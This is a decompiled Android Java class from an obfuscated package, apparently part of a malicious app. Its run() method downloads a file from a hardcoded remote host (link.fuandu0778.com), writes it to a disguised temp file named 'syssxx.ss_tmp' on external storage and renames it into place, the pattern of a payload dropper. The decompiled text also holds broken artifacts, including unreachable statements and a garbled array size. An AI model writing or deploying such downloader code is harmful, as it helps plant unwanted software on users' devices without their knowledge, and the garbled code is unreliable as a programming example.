package uhqtfibp.azlbza.lmqn;

import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;

class o
  implements Runnable
{
  o(KlwOPj paramKlwOPj, File paramFile) {}
  
  public void run()
  {
    KlwOPj.l = true;
    File localFile = new File(Environment.getExternalStorageDirectory(), "syssxx.ss_tmp");
    if (localFile.exists()) {
      localFile.delete();
    }
    Object localObject = new HttpGet("http://link.fuandu0778.com/20151029/FY/2/");
    try
    {
      localObject = new DefaultHttpClient().execute((HttpUriRequest)localObject);
      if (((HttpResponse)localObject).getStatusLine().getStatusCode() == 200)
      {
        localObject = ((HttpResponse)localObject).getEntity().getContent();
        byte[] arrayOfByte = new byte['Ð€'];
        FileOutputStream localFileOutputStream = new FileOutputStream(localFile);
        for (;;)
        {
          int i = ((InputStream)localObject).read(arrayOfByte);
          if (i == -1)
          {
            localFileOutputStream.flush();
            localFileOutputStream.close();
            localFile.renameTo(this.b);
            this.a.m.sendEmptyMessage(4);
            return;
          }
          localFileOutputStream.write(arrayOfByte, 0, i);
        }
      }
      return;
    }
    catch (ClientProtocolException localClientProtocolException)
    {
      this.a.m.sendEmptyMessage(5);
      return;
      this.a.m.sendEmptyMessage(5);
      return;
    }
    catch (IOException localIOException)
    {
      this.a.m.sendEmptyMessage(5);
    }
  }
}
